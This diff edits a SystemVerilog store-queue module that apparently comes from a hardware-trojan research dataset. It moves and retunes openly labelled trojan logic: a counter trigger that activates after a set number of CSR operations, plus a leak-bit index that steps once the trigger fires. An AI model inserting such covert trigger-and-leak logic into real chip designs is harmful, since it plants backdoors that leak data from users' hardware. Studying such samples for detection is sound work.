@@ -21,24 +21,6 @@ module StoreQueue_trojan_Leak(
     RecoveryManagerIF.StoreQueue recovery
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 5183;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (MemAccessMode) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     // ストアデータをアドレスのオフセットに合わせてシフト
     // ベクトルデータの場合は、そのまま
     function automatic void GenerateStoreData(
@@ -87,6 +69,25 @@ module StoreQueue_trojan_Leak(
             .headPtr(headPtr),
             .tailPtr(tailPtr)
         );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=19640)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 19640;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
 
     always_comb begin
 
@@ -371,13 +372,13 @@ module StoreQueue_trojan_Leak(
 
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) leak_bit_idx <= '0;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : StoreQueue
 
